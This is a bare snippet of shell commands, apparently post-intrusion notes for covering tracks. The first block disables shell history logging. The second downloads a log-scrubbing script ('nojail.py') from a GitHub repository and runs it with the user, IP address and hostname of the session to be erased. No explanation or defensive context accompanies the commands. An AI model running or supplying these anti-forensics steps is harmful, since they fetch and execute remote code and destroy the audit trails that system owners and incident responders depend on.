```
export HISTFILE=/dev/null
unset HISTFILE
unset SAVEHIST
```

```
wget https://raw.githubusercontent.com/JusticeRage/freedomfighting/master/nojail.py
python nojail.py --user [used user] --ip [used ip] --hostname [used host]
```
